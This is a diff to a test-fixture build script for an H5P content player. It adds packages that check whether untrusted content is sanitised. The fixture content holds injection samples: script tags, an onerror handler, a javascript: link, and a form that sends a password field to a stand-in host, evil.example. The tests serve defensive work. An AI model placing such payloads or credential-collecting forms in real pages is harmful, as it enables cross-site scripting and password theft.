@@ -1,6 +1,6 @@
 import { mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises'
 import { resolve, relative, sep } from 'node:path'
-import { BlobWriter, TextReader, Uint8ArrayReader, ZipWriter } from '@zip.js/zip.js'
+import { BlobWriter, TextReader, Uint8ArrayReader, Uint8ArrayWriter, ZipReader, ZipWriter } from '@zip.js/zip.js'
 import { GENERATED_FIXTURES } from './lib/fixture-names.mjs'
 
 /**
@@ -316,6 +316,47 @@ built.push([
       }
       await writer.add(renamed, new Uint8ArrayReader(contents))
     }
+  })
+])
+
+// 6a''. Content to check against the content type's semantics, played with the bundle: markup a
+//       field does not allow — a script, a handler, a form asking for a password — a scheme off
+//       the list, a field the semantics do not name, and the same in sub-content. Played trusted,
+//       all of it reaches the page, where only the frame's policy stops the scripts; untrusted,
+//       none of it does.
+const MARKUP_CONTENT = {
+  message: 'Checked against its semantics.',
+  html:
+    '<p class="kept">Kept <strong>bold</strong> and <a href="javascript:window.contentScriptRan = true" onclick="window.contentScriptRan = true">a link</a></p>' +
+    '<script>window.contentScriptRan = true</script><img src="x" onerror="window.contentScriptRan = true">' +
+    '<form action="https://evil.example/collect"><input name="password" placeholder="Your password"></form>',
+  stray: '<script>window.contentScriptRan = true</script>',
+  child: {
+    library: 'H5P.OfflineTest 1.0',
+    subContentId: '4f1b0c2e-8a7d-4e3b-9c1a-0d2e3f4a5b6c',
+    params: { message: 'A child.', html: '<em>Child</em><script>window.childScriptRan = true</script>' }
+  }
+}
+
+built.push([
+  'untrusted-markup.h5p',
+  await writeArchive('untrusted-markup.h5p', async (writer) => {
+    await writer.add('h5p.json', new TextReader(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8')))
+    await writer.add('content/content.json', new TextReader(JSON.stringify(MARKUP_CONTENT)))
+  })
+])
+
+// 6a'''. The bundle without the content type's semantics: nothing to check the content against,
+//        so an untrusted package does not play.
+built.push([
+  'libraries-without-semantics.h5p',
+  await writeArchive('libraries-without-semantics.h5p', async (writer) => {
+    const bundle = new ZipReader(new Uint8ArrayReader(new Uint8Array(await readFile(resolve(outDir, 'libraries.h5p')))))
+    for (const entry of await bundle.getEntries()) {
+      if (entry.directory || entry.filename.endsWith('/semantics.json')) continue
+      await writer.add(entry.filename, new Uint8ArrayReader(await entry.getData(new Uint8ArrayWriter())))
+    }
+    await bundle.close()
   })
 ])
 
